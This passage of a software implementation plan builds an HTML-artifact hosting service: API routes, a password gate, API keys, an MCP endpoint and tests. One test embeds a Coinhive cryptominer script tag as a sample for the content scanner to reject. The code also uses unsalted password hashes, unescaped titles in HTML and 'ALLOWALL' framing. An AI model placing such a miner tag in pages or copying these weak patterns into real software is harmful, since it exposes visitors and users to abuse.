    .from('artifacts')
    .update(updates)
    .eq('id', existing.id)
    .select()
    .single();

  if (error) {
    return NextResponse.json<ApiErrorResponse>({ error: 'Update failed' }, { status: 500 });
  }

  const { data: profile } = await supabase
    .from('users')
    .select('username')
    .eq('id', user.id)
    .single();

  const finalSlug = (updates.slug as string) || slug;
  const url = `${ARTIFACT_URL}/${profile?.username}/${finalSlug}.html`;

  return NextResponse.json({ artifact: updated, url });
};

export const DELETE = async (
  _request: NextRequest,
  { params }: { params: Promise<{ slug: string }> }
) => {
  const { slug } = await params;
  const supabase = await createClient();

  const { data: { user } } = await supabase.auth.getUser();
  if (!user) {
    return NextResponse.json<ApiErrorResponse>({ error: 'Unauthorized' }, { status: 401 });
  }

  const { data: artifact } = await supabase
    .from('artifacts')
    .select('id, storage_path')
    .eq('user_id', user.id)
    .eq('slug', slug)
    .single();

  if (!artifact) {
    return NextResponse.json<ApiErrorResponse>({ error: 'Not found' }, { status: 404 });
  }

  // Delete from storage and DB
  await supabase.storage.from('artifacts').remove([artifact.storage_path]);
  await supabase.from('artifacts').delete().eq('id', artifact.id);

  return NextResponse.json({ success: true });
};
```

**Step 2: Commit**

```bash
git add src/app/api/artifacts/[slug]/
git commit -m "feat: add artifact update and delete API routes"
```

---

### Task 10: API — Artifact Serving (smya.pub)

**Files:**
- Create: `src/app/api/serve/[...path]/route.ts`
- Create: `src/lib/password-gate.ts`
- Test: `src/lib/__tests__/password-gate.test.ts`

**Step 1: Write test for password gate HTML generator**

Create: `src/lib/__tests__/password-gate.test.ts`
```typescript
import { describe, it, expect } from 'vitest';
import { generatePasswordGatePage } from '../password-gate';

describe('generatePasswordGatePage', () => {
  it('returns HTML with a password form', () => {
    const html = generatePasswordGatePage('My Dashboard', '/user/dash.html');
    expect(html).toContain('<form');
    expect(html).toContain('type="password"');
    expect(html).toContain('My Dashboard');
  });
});
```

**Step 2: Run test to verify it fails**

Run: `npx vitest run src/lib/__tests__/password-gate.test.ts`
Expected: FAIL

**Step 3: Implement password gate page**

Create: `src/lib/password-gate.ts`
```typescript
export const generatePasswordGatePage = (title: string, actionUrl: string): string => {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${title} — Password Required</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: system-ui, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #0a0a0a; color: #fafafa; }
    .card { max-width: 400px; width: 90%; padding: 2rem; border: 1px solid #333; border-radius: 12px; }
    h1 { font-size: 1.25rem; margin-bottom: 0.5rem; }
    p { color: #888; margin-bottom: 1.5rem; font-size: 0.875rem; }
    input { width: 100%; padding: 0.75rem; border: 1px solid #333; border-radius: 8px; background: #111; color: #fafafa; font-size: 1rem; margin-bottom: 1rem; }
    input:focus { outline: none; border-color: #666; }
    button { width: 100%; padding: 0.75rem; border: none; border-radius: 8px; background: #fafafa; color: #0a0a0a; font-size: 1rem; cursor: pointer; font-weight: 500; }
    button:hover { background: #ddd; }
    .error { color: #f87171; font-size: 0.875rem; margin-bottom: 1rem; display: none; }
  </style>
</head>
<body>
  <div class="card">
    <h1>${title}</h1>
    <p>This artifact is password-protected.</p>
    <div class="error" id="error">Incorrect password. Please try again.</div>
    <form method="POST" action="${actionUrl}">
      <input type="password" name="password" placeholder="Enter password" required autofocus />
      <button type="submit">View Artifact</button>
    </form>
  </div>
</body>
</html>`;
};
```

**Step 4: Run test to verify it passes**

Run: `npx vitest run src/lib/__tests__/password-gate.test.ts`
Expected: PASS

**Step 5: Implement artifact serving route**

Create: `src/app/api/serve/[...path]/route.ts`
```typescript
import { NextRequest, NextResponse } from 'next/server';
import { createClient as createServiceClient } from '@supabase/supabase-js';
import { generatePasswordGatePage } from '@/lib/password-gate';

// Use service role for artifact serving — no user auth needed
const getServiceClient = () =>
  createServiceClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!
  );

const parseArtifactPath = (path: string[]): { username: string; slug: string } | null => {
  // Expected: ["username", "artifact-name.html"]
  if (path.length !== 2) return null;
  const [username, filename] = path;
  const slug = filename.replace(/\.html$/, '');
  if (!username || !slug) return null;
  return { username, slug };
};

export const GET = async (
  request: NextRequest,
  { params }: { params: Promise<{ path: string[] }> }
) => {
  const { path } = await params;
  const parsed = parseArtifactPath(path);

  if (!parsed) {
    return new NextResponse('Not found', { status: 404 });
  }

  const supabase = getServiceClient();

  // Look up user by username
  const { data: user } = await supabase
    .from('users')
    .select('id')
    .eq('username', parsed.username)
    .single();

  if (!user) {
    return new NextResponse('Not found', { status: 404 });
  }

  // Look up artifact
  const { data: artifact } = await supabase
    .from('artifacts')
    .select('*')
    .eq('user_id', user.id)
    .eq('slug', parsed.slug)
    .single();

  if (!artifact) {
    return new NextResponse('Not found', { status: 404 });
  }

  // Password-protected: show gate
  if (artifact.visibility === 'password_protected' && artifact.password_hash) {
    const gatePage = generatePasswordGatePage(
      artifact.title,
      `/${parsed.username}/${parsed.slug}.html`
    );
    return new NextResponse(gatePage, {
      status: 200,
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
    });
  }

  // Serve the HTML
  return await serveArtifact(supabase, artifact);
};

export const POST = async (
  request: NextRequest,
  { params }: { params: Promise<{ path: string[] }> }
) => {
  const { path } = await params;
  const parsed = parseArtifactPath(path);

  if (!parsed) {
    return new NextResponse('Not found', { status: 404 });
  }

  const supabase = getServiceClient();

  const { data: user } = await supabase
    .from('users')
    .select('id')
    .eq('username', parsed.username)
    .single();

  if (!user) {
    return new NextResponse('Not found', { status: 404 });
  }

  const { data: artifact } = await supabase
    .from('artifacts')
    .select('*')
    .eq('user_id', user.id)
    .eq('slug', parsed.slug)
    .single();

  if (!artifact || !artifact.password_hash) {
    return new NextResponse('Not found', { status: 404 });
  }

  // Validate password
  const formData = await request.formData();
  const password = formData.get('password') as string;

  const encoder = new TextEncoder();
  const data = encoder.encode(password);
  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
  const hash = Array.from(new Uint8Array(hashBuffer))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');

  if (hash !== artifact.password_hash) {
    const gatePage = generatePasswordGatePage(
      artifact.title,
      `/${parsed.username}/${parsed.slug}.html`
    );
    // Return with error visible
    const withError = gatePage.replace('display: none', 'display: block');
    return new NextResponse(withError, {
      status: 200,
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
    });
  }

  return await serveArtifact(supabase, artifact);
};

const serveArtifact = async (supabase: ReturnType<typeof createServiceClient>, artifact: Record<string, unknown>) => {
  const { data: fileData, error } = await supabase.storage
    .from('artifacts')
    .download(artifact.storage_path as string);

  if (error || !fileData) {
    return new NextResponse('File not found', { status: 404 });
  }

  // Increment view count (fire and forget)
  supabase
    .from('artifacts')
    .update({
      view_count: (artifact.view_count as number) + 1,
      last_accessed_at: new Date().toISOString(),
    })
    .eq('id', artifact.id)
    .then(() => {});

  const html = await fileData.text();

  return new NextResponse(html, {
    status: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'public, max-age=300',
      'X-Frame-Options': 'ALLOWALL',
    },
  });
};
```

**Step 6: Commit**

```bash
git add src/app/api/serve/ src/lib/password-gate.ts src/lib/__tests__/password-gate.test.ts
git commit -m "feat: add artifact serving with password gate for smya.pub"
```

---

### Task 11: API — API Key Management

**Files:**
- Create: `src/app/api/auth/api-keys/route.ts`
- Create: `src/lib/api-key.ts`
- Test: `src/lib/__tests__/api-key.test.ts`

**Step 1: Write tests for API key generation**

Create: `src/lib/__tests__/api-key.test.ts`
```typescript
import { describe, it, expect } from 'vitest';
import { generateApiKey, hashApiKey, getKeyPrefix } from '../api-key';

describe('API key utilities', () => {
  it('generates a key with sma_ prefix', () => {
    const key = generateApiKey();
    expect(key).toMatch(/^sma_[a-f0-9]{48}$/);
  });

  it('generates unique keys', () => {
    const key1 = generateApiKey();
    const key2 = generateApiKey();
    expect(key1).not.toBe(key2);
  });

  it('hashes a key deterministically', async () => {
    const key = 'sma_abc123';
    const hash1 = await hashApiKey(key);
    const hash2 = await hashApiKey(key);
    expect(hash1).toBe(hash2);
  });

  it('extracts prefix for display', () => {
    const key = 'sma_abcdef1234567890';
    expect(getKeyPrefix(key)).toBe('sma_abcd');
  });
});
```

**Step 2: Run test to verify it fails**

Run: `npx vitest run src/lib/__tests__/api-key.test.ts`
Expected: FAIL

**Step 3: Implement API key utilities**

Create: `src/lib/api-key.ts`
```typescript
import { randomBytes } from 'crypto';

export const generateApiKey = (): string => {
  const bytes = randomBytes(24);
  return `sma_${bytes.toString('hex')}`;
};

export const hashApiKey = async (key: string): Promise<string> => {
  const encoder = new TextEncoder();
  const data = encoder.encode(key);
  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
  return Array.from(new Uint8Array(hashBuffer))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');
};

export const getKeyPrefix = (key: string): string => {
  return key.slice(0, 8);
};
```

**Step 4: Run test to verify it passes**

Run: `npx vitest run src/lib/__tests__/api-key.test.ts`
Expected: PASS

**Step 5: Implement API key routes**

Create: `src/app/api/auth/api-keys/route.ts`
```typescript
import { NextRequest, NextResponse } from 'next/server';
import { createClient } from '@/lib/supabase/server';
import { generateApiKey, hashApiKey, getKeyPrefix } from '@/lib/api-key';
import type { ApiErrorResponse } from '@/types/api';

export const POST = async (request: NextRequest) => {
  const supabase = await createClient();

  const { data: { user } } = await supabase.auth.getUser();
  if (!user) {
    return NextResponse.json<ApiErrorResponse>({ error: 'Unauthorized' }, { status: 401 });
  }

  const body = await request.json();
  const name = body.name || 'Default';

  const rawKey = generateApiKey();
  const keyHash = await hashApiKey(rawKey);
  const keyPrefix = getKeyPrefix(rawKey);

  const { data, error } = await supabase
    .from('api_keys')
    .insert({
      user_id: user.id,
      key_hash: keyHash,
      key_prefix: keyPrefix,
      name,
    })
    .select('id, key_prefix, name, created_at')
    .single();

  if (error) {
    return NextResponse.json<ApiErrorResponse>({ error: 'Failed to create API key' }, { status: 500 });
  }

  // Return the raw key ONCE — it can never be retrieved again
  return NextResponse.json({ ...data, key: rawKey }, { status: 201 });
};

export const GET = async () => {
  const supabase = await createClient();

  const { data: { user } } = await supabase.auth.getUser();
  if (!user) {
    return NextResponse.json<ApiErrorResponse>({ error: 'Unauthorized' }, { status: 401 });
  }

  const { data: keys } = await supabase
    .from('api_keys')
    .select('id, key_prefix, name, created_at, last_used_at')
    .eq('user_id', user.id)
    .order('created_at', { ascending: false });

  return NextResponse.json(keys || []);
};
```

**Step 6: Commit**

```bash
git add src/lib/api-key.ts src/lib/__tests__/api-key.test.ts src/app/api/auth/api-keys/
git commit -m "feat: add API key generation, hashing, and management routes"
```

---

### Task 12: API Key Auth Middleware (for MCP)

**Files:**
- Create: `src/lib/api-auth.ts`
- Test: `src/lib/__tests__/api-auth.test.ts`

**Step 1: Write test for API key authentication**

Create: `src/lib/__tests__/api-auth.test.ts`
```typescript
import { describe, it, expect } from 'vitest';
import { extractBearerToken } from '../api-auth';

describe('extractBearerToken', () => {
  it('extracts token from Bearer header', () => {
    expect(extractBearerToken('Bearer sma_abc123')).toBe('sma_abc123');
  });

  it('returns null for missing header', () => {
    expect(extractBearerToken(null)).toBeNull();
  });

  it('returns null for non-Bearer header', () => {
    expect(extractBearerToken('Basic abc123')).toBeNull();
  });

  it('returns null for empty Bearer', () => {
    expect(extractBearerToken('Bearer ')).toBeNull();
  });
});
```

**Step 2: Run test to verify it fails**

Run: `npx vitest run src/lib/__tests__/api-auth.test.ts`
Expected: FAIL

**Step 3: Implement API auth**

Create: `src/lib/api-auth.ts`
```typescript
import { createClient } from '@supabase/supabase-js';
import { hashApiKey } from './api-key';

export const extractBearerToken = (header: string | null): string | null => {
  if (!header) return null;
  const match = header.match(/^Bearer\s+(\S+)$/);
  return match ? match[1] : null;
};

export const authenticateApiKey = async (token: string) => {
  const supabase = createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!
  );

  const keyHash = await hashApiKey(token);

  const { data: apiKey } = await supabase
    .from('api_keys')
    .select('id, user_id')
    .eq('key_hash', keyHash)
    .single();

  if (!apiKey) return null;

  // Update last_used_at
  await supabase
    .from('api_keys')
    .update({ last_used_at: new Date().toISOString() })
    .eq('id', apiKey.id);

  // Get user profile
  const { data: user } = await supabase
    .from('users')
    .select('id, username')
    .eq('id', apiKey.user_id)
    .single();

  return user;
};
```

**Step 4: Run test to verify it passes**

Run: `npx vitest run src/lib/__tests__/api-auth.test.ts`
Expected: PASS

**Step 5: Commit**

```bash
git add src/lib/api-auth.ts src/lib/__tests__/api-auth.test.ts
git commit -m "feat: add API key authentication for MCP/external access"
```

---

### Task 13: MCP Server Endpoint

**Files:**
- Create: `src/app/api/mcp/route.ts`
- Create: `src/lib/mcp-tools.ts`

**Step 1: Implement MCP tool definitions**

Create: `src/lib/mcp-tools.ts`
```typescript
export const MCP_TOOLS = [
  {
    name: 'upload_artifact',
    description: 'Upload an HTML artifact to ShareMyArtifact. Returns a shareable URL. Only the html parameter is required — title, slug, visibility, and password are all optional.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        html: { type: 'string', description: 'The HTML content to upload' },
        title: { type: 'string', description: 'Optional title (auto-extracted from <title> or <h1> if not provided)' },
        slug: { type: 'string', description: 'Optional URL slug (auto-generated from title if not provided)' },
        visibility: { type: 'string', enum: ['public', 'unlisted', 'password_protected'], description: 'Visibility setting (defaults to unlisted)' },
        password: { type: 'string', description: 'Optional password to protect the artifact' },
      },
      required: ['html'],
    },
  },
  {
    name: 'list_artifacts',
    description: 'List all artifacts belonging to the authenticated user.',
    inputSchema: {
      type: 'object' as const,
      properties: {},
    },
  },
  {
    name: 'update_artifact',
    description: 'Update an existing artifact. Use slug to identify which artifact to update.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        slug: { type: 'string', description: 'The slug of the artifact to update' },
        html: { type: 'string', description: 'New HTML content (replaces existing)' },
        title: { type: 'string', description: 'New title' },
        new_slug: { type: 'string', description: 'New URL slug' },
        visibility: { type: 'string', enum: ['public', 'unlisted', 'password_protected'] },
        password: { type: 'string', description: 'New password (or null to remove)' },
      },
      required: ['slug'],
    },
  },
  {
    name: 'delete_artifact',
    description: 'Delete an artifact permanently.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        slug: { type: 'string', description: 'The slug of the artifact to delete' },
      },
      required: ['slug'],
    },
  },
];
```

**Step 2: Implement MCP route handler**

Create: `src/app/api/mcp/route.ts`
```typescript
import { NextRequest, NextResponse } from 'next/server';
import { extractBearerToken, authenticateApiKey } from '@/lib/api-auth';
import { MCP_TOOLS } from '@/lib/mcp-tools';
import { processUpload } from '@/lib/artifact-service';
import { createClient } from '@supabase/supabase-js';
import type { ApiErrorResponse } from '@/types/api';

const ARTIFACT_URL = process.env.NEXT_PUBLIC_ARTIFACT_URL || 'https://smya.pub';

const getServiceClient = () =>
  createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!
  );

export const POST = async (request: NextRequest) => {
  const body = await request.json();
  const { method, params, id } = body;

  // Handle MCP protocol methods
  if (method === 'initialize') {
    return NextResponse.json({
      jsonrpc: '2.0',
      id,
      result: {
        protocolVersion: '2024-11-05',
        capabilities: { tools: {} },
        serverInfo: {
          name: 'sharemyartifact',
          version: '1.0.0',
        },
      },
    });
  }

  if (method === 'tools/list') {
    return NextResponse.json({
      jsonrpc: '2.0',
      id,
      result: { tools: MCP_TOOLS },
    });
  }

  if (method === 'tools/call') {
    // Authenticate
    const token = extractBearerToken(request.headers.get('authorization'));
    if (!token) {
      return NextResponse.json({
        jsonrpc: '2.0',
        id,
        error: { code: -32000, message: 'Missing API key in Authorization header' },
      });
    }

    const user = await authenticateApiKey(token);
    if (!user) {
      return NextResponse.json({
        jsonrpc: '2.0',
        id,
        error: { code: -32000, message: 'Invalid API key' },
      });
    }

    const supabase = getServiceClient();
    const toolName = params?.name;
    const args = params?.arguments || {};

    try {
      const result = await handleToolCall(supabase, user, toolName, args);
      return NextResponse.json({
        jsonrpc: '2.0',
        id,
        result: {
          content: [{ type: 'text', text: JSON.stringify(result, null, 2) }],
        },
      });
    } catch (err) {
      return NextResponse.json({
        jsonrpc: '2.0',
        id,
        result: {
          content: [{ type: 'text', text: `Error: ${err instanceof Error ? err.message : 'Unknown error'}` }],
          isError: true,
        },
      });
    }
  }

  return NextResponse.json({
    jsonrpc: '2.0',
    id,
    error: { code: -32601, message: `Unknown method: ${method}` },
  });
};

const handleToolCall = async (
  supabase: ReturnType<typeof createClient>,
  user: { id: string; username: string },
  toolName: string,
  args: Record<string, unknown>
) => {
  switch (toolName) {
    case 'upload_artifact': {
      const html = args.html as string;
      if (!html) throw new Error('html is required');

      const processed = processUpload(html, {
        title: args.title as string | undefined,
        slug: args.slug as string | undefined,
      });

      const storagePath = `${user.id}/${processed.slug}.html`;
      const { error: storageError } = await supabase.storage
        .from('artifacts')
        .upload(storagePath, html, { contentType: 'text/html', upsert: false });

      if (storageError) throw new Error(`Storage error: ${storageError.message}`);

      let passwordHash: string | null = null;
      if (args.password) {
        const encoder = new TextEncoder();
        const data = encoder.encode(args.password as string);
        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
        passwordHash = Array.from(new Uint8Array(hashBuffer))
          .map(b => b.toString(16).padStart(2, '0'))
          .join('');
      }

      const visibility = (args.visibility as string) || (args.password ? 'password_protected' : 'unlisted');

      const { data: artifact, error: dbError } = await supabase
        .from('artifacts')
        .insert({
          user_id: user.id,
          slug: processed.slug,
          title: processed.title,
          visibility,
          password_hash: passwordHash,
          storage_path: storagePath,
          file_size: new Blob([html]).size,
        })
        .select()
        .single();

      if (dbError) {
        await supabase.storage.from('artifacts').remove([storagePath]);
        throw new Error(`Database error: ${dbError.message}`);
      }

      const url = `${ARTIFACT_URL}/${user.username}/${processed.slug}.html`;
      return { artifact, url, message: `Artifact uploaded successfully! View at: ${url}` };
    }

    case 'list_artifacts': {
      const { data: artifacts } = await supabase
        .from('artifacts')
        .select('slug, title, visibility, view_count, created_at, updated_at')
        .eq('user_id', user.id)
        .order('created_at', { ascending: false });

      return (artifacts || []).map(a => ({
        ...a,
        url: `${ARTIFACT_URL}/${user.username}/${a.slug}.html`,
      }));
    }

    case 'update_artifact': {
      const slug = args.slug as string;
      if (!slug) throw new Error('slug is required');

      const { data: existing } = await supabase
        .from('artifacts')
        .select('*')
        .eq('user_id', user.id)
        .eq('slug', slug)
        .single();

      if (!existing) throw new Error(`Artifact "${slug}" not found`);

      const updates: Record<string, unknown> = { updated_at: new Date().toISOString() };

      if (args.html) {
        processUpload(args.html as string); // validate
        await supabase.storage
          .from('artifacts')
          .update(existing.storage_path, args.html as string, { contentType: 'text/html' });
        updates.file_size = new Blob([args.html as string]).size;
      }

      if (args.title) updates.title = args.title;
      if (args.visibility) updates.visibility = args.visibility;
      if (args.new_slug) updates.slug = args.new_slug;

      const { data: updated } = await supabase
        .from('artifacts')
        .update(updates)
        .eq('id', existing.id)
        .select()
        .single();

      const finalSlug = (args.new_slug as string) || slug;
      const url = `${ARTIFACT_URL}/${user.username}/${finalSlug}.html`;
      return { artifact: updated, url, message: `Artifact updated! View at: ${url}` };
    }

    case 'delete_artifact': {
      const slug = args.slug as string;
      if (!slug) throw new Error('slug is required');

      const { data: artifact } = await supabase
        .from('artifacts')
        .select('id, storage_path')
        .eq('user_id', user.id)
        .eq('slug', slug)
        .single();

      if (!artifact) throw new Error(`Artifact "${slug}" not found`);

      await supabase.storage.from('artifacts').remove([artifact.storage_path]);
      await supabase.from('artifacts').delete().eq('id', artifact.id);

      return { message: `Artifact "${slug}" deleted successfully.` };
    }

    default:
      throw new Error(`Unknown tool: ${toolName}`);
  }
};
```

**Step 3: Commit**

```bash
git add src/lib/mcp-tools.ts src/app/api/mcp/
git commit -m "feat: add remote MCP server endpoint with tool handlers"
```

---

### Task 14: User Profile API

**Files:**
- Create: `src/app/api/users/[username]/route.ts`

**Step 1: Implement user profile endpoint**

Create: `src/app/api/users/[username]/route.ts`
```typescript
import { NextRequest, NextResponse } from 'next/server';
import { createClient } from '@supabase/supabase-js';
import type { ApiErrorResponse } from '@/types/api';

const ARTIFACT_URL = process.env.NEXT_PUBLIC_ARTIFACT_URL || 'https://smya.pub';

export const GET = async (
  _request: NextRequest,
  { params }: { params: Promise<{ username: string }> }
) => {
  const { username } = await params;

  const supabase = createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!
  );

  const { data: user } = await supabase
    .from('users')
    .select('id, username, created_at')
    .eq('username', username)
    .single();

  if (!user) {
    return NextResponse.json<ApiErrorResponse>({ error: 'User not found' }, { status: 404 });
  }

  // Only return public artifacts
  const { data: artifacts } = await supabase
    .from('artifacts')
    .select('slug, title, view_count, created_at, updated_at')
    .eq('user_id', user.id)
    .eq('visibility', 'public')
    .order('created_at', { ascending: false });

  return NextResponse.json({
    user: { username: user.username, created_at: user.created_at },
    artifacts: (artifacts || []).map(a => ({
      ...a,
      url: `${ARTIFACT_URL}/${username}/${a.slug}.html`,
    })),
  });
};
```

**Step 2: Commit**

```bash
git add src/app/api/users/
git commit -m "feat: add public user profile API endpoint"
```

---

### Task 15: Web UI — Layout, Landing Page, Dashboard

**Files:**
- Modify: `src/app/layout.tsx`
- Create: `src/app/page.tsx` (landing)
- Create: `src/app/dashboard/page.tsx`
- Create: `src/app/dashboard/layout.tsx`
- Create: `src/app/[username]/page.tsx` (public profile)
- Create: `src/components/` (various)

**Note:** This task should use the `frontend-design` skill to create distinctive, polished UI. The exact component code will be generated during execution.

**Step 1: Install shadcn/ui**

Run:
```bash
npx shadcn@latest init -d
```

**Step 2: Add required shadcn components**

Run:
```bash
npx shadcn@latest add button card input label dialog dropdown-menu table badge toast
```

**Step 3: Create app layout with Supabase auth provider**

Implement `src/app/layout.tsx` with global styles, font, metadata.

**Step 4: Create landing page**

Implement `src/app/page.tsx` — simple hero explaining the product, CTA to sign up.

**Step 5: Create dashboard layout with auth guard**

Implement `src/app/dashboard/layout.tsx` — redirects to login if not authenticated.

**Step 6: Create dashboard page**

Implement `src/app/dashboard/page.tsx`:
- Lists user's artifacts (all visibilities)
- Upload button (drag-and-drop or file picker)
- Each artifact shows: title, visibility badge, view count, URL (copyable), actions (edit, delete)
- Edit dialog: rename, change visibility, set/remove password, replace HTML

**Step 7: Create public profile page**

Implement `src/app/[username]/page.tsx`:
- Shows username and join date
- Lists public artifacts with titles and dates
- Search/filter by title

**Step 8: Create auth pages with real UI**

Update `src/app/auth/signup/page.tsx`, `src/app/auth/login/page.tsx`, `src/app/auth/username/page.tsx` with actual forms using shadcn components.

**Step 9: Verify build passes**

Run: `npm run build`
Expected: Build succeeds with no errors

**Step 10: Commit**

```bash
git add -A
git commit -m "feat: add web UI — landing page, dashboard, auth pages, public profiles"
```

---

### Task 16: Dashboard — API Key Management UI

**Files:**
- Create: `src/app/dashboard/settings/page.tsx`

**Step 1: Create settings page**

Implement `src/app/dashboard/settings/page.tsx`:
- "API Keys" section
- Button to generate new key with a name
- Shows existing keys (prefix only, never full key)
- Copy full key shown ONCE on creation
- Delete key button with confirmation

**Step 2: Verify build passes**

Run: `npm run build`
Expected: PASS

**Step 3: Commit**

```bash
git add src/app/dashboard/settings/
git commit -m "feat: add API key management settings page"
```

---

### Task 17: Vercel Configuration

**Files:**
- Create: `vercel.json`

**Step 1: Create Vercel config for multi-domain routing**

Create: `vercel.json`
```json
{
  "$schema": "https://openapi.vercel.sh/vercel.json",
  "framework": "nextjs"
}
```

Note: Domain routing is handled by Next.js middleware, not Vercel config. Both `sharemyartifact.com` and `smya.pub` are added as domains in the Vercel project dashboard.

**Step 2: Update next.config.ts for artifact domain**

Add to `next.config.ts`:
```typescript
const nextConfig = {
  async headers() {
    return [
      {
        // Headers for artifact serving domain
        source: '/api/serve/:path*',
        headers: [
          { key: 'X-Frame-Options', value: 'ALLOWALL' },
          { key: 'X-Content-Type-Options', value: 'nosniff' },
        ],
      },
    ];
  },
};
```

**Step 3: Commit**

```bash
git add vercel.json next.config.ts
git commit -m "chore: add Vercel config and artifact serving headers"
```

---

### Task 18: MCP Skill Document

**Files:**
- Create: `docs/mcp-skill.md`

**Step 1: Write the AI skill document**

Create: `docs/mcp-skill.md`
```markdown
# ShareMyArtifact MCP Skill

## Setup
Add this MCP server to your AI tool configuration:
- URL: `https://sharemyartifact.com/api/mcp`
- Authentication: Bearer token (API key from your account settings)

## Available Tools

### upload_artifact
Upload an HTML file and get a shareable link.

**Usage:** When the user has finished creating an HTML dashboard/artifact and wants to share it, use this tool. Only the `html` parameter is required — everything else is auto-detected.

**Before uploading:** Ask the user:
1. "Should this be public (visible on your profile), unlisted (link-only), or password-protected?"
   - Default to unlisted if they don't care
2. Only ask about title if the HTML doesn't have a `<title>` tag

**After uploading:** Share the returned URL with the user.

### list_artifacts
List all of the user's artifacts. Use this when the user wants to see what they've uploaded.

### update_artifact
Update an existing artifact. Use this when:
- The user wants to upload a new version of an existing dashboard
- **Important:** Before uploading, call `list_artifacts` to check if an artifact with a similar name already exists. If it does, ask: "You already have '[title]' — should I replace it or upload as a new artifact?"

### delete_artifact
Delete an artifact. Always confirm with the user before deleting.
```

**Step 2: Commit**

```bash
git add docs/mcp-skill.md
git commit -m "docs: add MCP skill document for AI tool integration"
```

---

### Task 19: End-to-End Testing

**Files:**
- Create: `src/test/e2e/upload-flow.test.ts`

**Step 1: Write integration test for the upload flow**

Create: `src/test/e2e/upload-flow.test.ts`
```typescript
import { describe, it, expect } from 'vitest';
import { processUpload } from '@/lib/artifact-service';
import { extractTitle } from '@/lib/extract-title';
import { slugify } from '@/lib/slugify';
import { scanContent } from '@/lib/content-scanner';

describe('Upload flow integration', () => {
  const sampleHtml = `<!DOCTYPE html>
<html>
<head><title>Q1 Sales Dashboard</title></head>
<body>
  <h1>Q1 Sales Dashboard</h1>
  <script>
    fetch('https://api.example.com/sales')
      .then(r => r.json())
      .then(data => console.log(data));
  </script>
</body>
</html>`;

  it('processes a valid HTML artifact end-to-end', () => {
    const scan = scanContent(sampleHtml);
    expect(scan.safe).toBe(true);

    const title = extractTitle(sampleHtml);
    expect(title).toBe('Q1 Sales Dashboard');

    const slug = slugify(title!);
    expect(slug).toBe('q1-sales-dashboard');

    const result = processUpload(sampleHtml);
    expect(result.title).toBe('Q1 Sales Dashboard');
    expect(result.slug).toBe('q1-sales-dashboard');
    expect(result.html).toBe(sampleHtml);
  });

  it('rejects malicious content at the pipeline level', () => {
    const malicious = '<script src="https://coinhive.com/lib/coinhive.min.js"></script>';
    expect(() => processUpload(malicious)).toThrow('Content flagged');
  });

  it('handles HTML with no title gracefully', () => {
    const noTitle = '<html><body><p>Hello world</p></body></html>';
    const result = processUpload(noTitle);
    expect(result.slug).toMatch(/^artifact-\d+$/);
  });
});
```

**Step 2: Run all tests**

Run: `npx vitest run`
Expected: All tests pass

**Step 3: Commit**

```bash
git add src/test/e2e/
git commit -m "test: add end-to-end upload flow integration test"
```

---

### Task 20: Final Verification & Cleanup

**Step 1: Run full test suite**

Run: `npx vitest run`
Expected: All tests pass

**Step 2: Run build**

Run: `npm run build`
Expected: Build succeeds

**Step 3: Run linter**

Run: `npm run lint`
Expected: No errors

**Step 4: Review all files for consistency**

Check that all imports resolve, types align, and no TODO comments remain.

**Step 5: Final commit if any cleanup needed**

```bash
git add -A
git commit -m "chore: final cleanup and verification"
```
